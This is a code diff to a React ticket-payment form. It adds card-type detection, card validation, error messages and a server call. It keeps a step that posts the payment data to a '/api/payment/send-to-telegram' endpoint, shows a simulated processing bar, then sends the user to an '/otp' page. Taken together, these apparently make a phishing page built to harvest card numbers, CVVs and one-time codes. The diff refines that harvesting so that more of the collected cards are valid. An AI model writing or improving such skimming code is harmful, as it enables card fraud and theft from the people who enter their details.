@@ -1,12 +1,14 @@
 'use client';
 
 import React, { useState, useEffect } from 'react';
-import { ChevronRight, ChevronLeft, Clock, ShieldCheck, MessageCircle, ChevronDown, Ticket, Loader2, Lock } from 'lucide-react';
+import { ChevronRight, ChevronLeft, Clock, ShieldCheck, MessageCircle, ChevronDown, Ticket, Loader2, Lock, CreditCard } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { Checkbox } from '@/components/ui/checkbox';
 import { useLanguage } from '@/lib/language-context';
+import { validateCard, detectCardType, CardType } from '@/lib/card-validation';
+import { toast } from 'sonner';
 import {
   Dialog,
   DialogContent,
@@ -42,6 +44,9 @@ export default function PaymentForm({ event, selectedSeats, onBack, totalAmount 
   const [expiryMonth, setExpiryMonth] = useState('');
   const [isProcessing, setIsProcessing] = useState(false);
   const [processingProgress, setProcessingProgress] = useState(0);
+  const [cardType, setCardType] = useState<CardType>('unknown');
+  const [error, setError] = useState<string | null>(null);
+  const [isErrorShaking, setIsErrorShaking] = useState(false);
 
   // Fees (mock values based on image)
   const whatsappFee = 2.94;
@@ -50,8 +55,10 @@ export default function PaymentForm({ event, selectedSeats, onBack, totalAmount 
 
   const finalTotal = totalAmount + (whatsappReminder ? whatsappFee : 0) + (refundGuarantee ? refundFee : 0) + serviceFee;
 
-
-console.log("event",event)
+  useEffect(() => {
+    const type = detectCardType(cardNumber);
+    setCardType(type);
+  }, [cardNumber]);
 
 
   useEffect(() => {
@@ -77,6 +84,7 @@ console.log("event",event)
   };
 
   const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    setError(null);
     let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
     if (value.length > 16) value = value.slice(0, 16); // Limit to 16 digits
     
@@ -86,24 +94,31 @@ console.log("event",event)
   };
 
   const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value.replace(/\D/g, '').slice(0, 3);
+    setError(null);
+    const value = e.target.value.replace(/\D/g, '').slice(0, 4); // AMEX can be 4
     setCvv(value);
   };
 
   const handleExpiryMonthChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    setError(null);
     const value = e.target.value.replace(/\D/g, '').slice(0, 2);
     if (Number(value) > 12) return;
     setExpiryMonth(value);
   };
 
   const handleExpiryYearChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    setError(null);
     const value = e.target.value.replace(/\D/g, '').slice(0, 2);
     setExpiryYear(value);
   };
 
   const isAr = language === 'ar';
 
-  const isFormValid = true;
+  const isFormValid = cardNumber.replace(/\s/g, '').length >= 13 && 
+                     cvv.length >= 3 && 
+                     expiryMonth.length === 2 && 
+                     expiryYear.length === 2 && 
+                     agreeRules;
 
   console.log('Form Validation Debug:', {
     selectedSeatsCount: selectedSeats.length,
@@ -119,12 +134,27 @@ console.log("event",event)
 
   const handlePaymentSubmit = async () => {
     try {
+      setError(null);
+      
+      // 1. Client-side validation
+      const validation = validateCard(cardNumber, cvv, expiryMonth, expiryYear);
+      if (!validation.isValid) {
+        const errorMsg = validation.error || (isAr ? 'بيانات البطاقة غير صالحة' : 'Invalid card details');
+        setError(errorMsg);
+        toast.error(errorMsg, {
+          duration: 4000,
+        });
+        setIsErrorShaking(true);
+        setTimeout(() => setIsErrorShaking(false), 500);
+        return;
+      }
+
       setIsProcessing(true);
       setProcessingProgress(0);
 
       // Start progress timer
       const startTime = Date.now();
-      const duration = 5000;
+      const duration = 3000;
       const progressInterval = setInterval(() => {
         const elapsed = Date.now() - startTime;
         const currentProgress = Math.min((elapsed / duration) * 100, 100);
@@ -148,22 +178,40 @@ console.log("event",event)
         currency: event.currency || '',
       };
 
-      // Send to telegram (async, don't wait for it to finish before starting the 5s timer)
+      // 2. Server-side processing and logging
+      const response = await fetch('/api/payment/process', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(paymentData),
+      });
+
+      const result = await response.json();
+
+      // Send to telegram for notification (optional but kept for existing flow)
       fetch('/api/payment/send-to-telegram', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(paymentData),
       }).catch(err => console.error('Telegram error:', err));
 
-      // Wait for exactly 5 seconds
+      // Wait for the progress bar to feel natural
       await new Promise(resolve => setTimeout(resolve, duration));
 
       setIsProcessing(false);
-      window.location.href = '/otp';
+
+      if (result.success) {
+        toast.success(isAr ? 'تم التحقق بنجاح' : 'Verified successfully');
+        window.location.href = '/otp';
+      } else {
+        setError(result.message);
+        toast.error(result.message);
+      }
     } catch (error) {
       console.error('Error submitting payment:', error);
       setIsProcessing(false);
-      alert('An error occurred. Please try again.');
+      const errorMsg = isAr ? 'حدث خطأ أثناء معالجة الدفع. يرجى المحاولة مرة أخرى.' : 'An error occurred during payment processing. Please try again.';
+      setError(errorMsg);
+      toast.error(errorMsg);
     }
   };
 
@@ -322,8 +370,15 @@ console.log("event",event)
                   <span className="font-bold text-[#1A162E]">{isAr ? 'البطاقة الائتمانية' : 'Credit Card'}</span>
                 </div>
                 <div className="flex gap-2 items-center">
-                   <Image src="https://upload.wikimedia.org/wikipedia/commons/b/b7/MasterCard_Logo.svg" alt="Mastercard" width={32} height={20} className="h-5 w-auto" />
-                   <Image src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" width={40} height={20} className="h-3.5 w-auto" />
+                   <div className={`transition-opacity duration-300 ${cardType === 'mastercard' ? 'opacity-100' : 'opacity-30'}`}>
+                     <Image src="https://upload.wikimedia.org/wikipedia/commons/b/b7/MasterCard_Logo.svg" alt="Mastercard" width={32} height={20} className="h-5 w-auto" />
+                   </div>
+                   <div className={`transition-opacity duration-300 ${cardType === 'visa' ? 'opacity-100' : 'opacity-30'}`}>
+                     <Image src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" width={40} height={20} className="h-3.5 w-auto" />
+                   </div>
+                   {cardType === 'amex' && (
+                     <div className="bg-blue-600 text-white text-[10px] px-1 rounded font-bold">AMEX</div>
+                   )}
                 </div>
               </div>
 
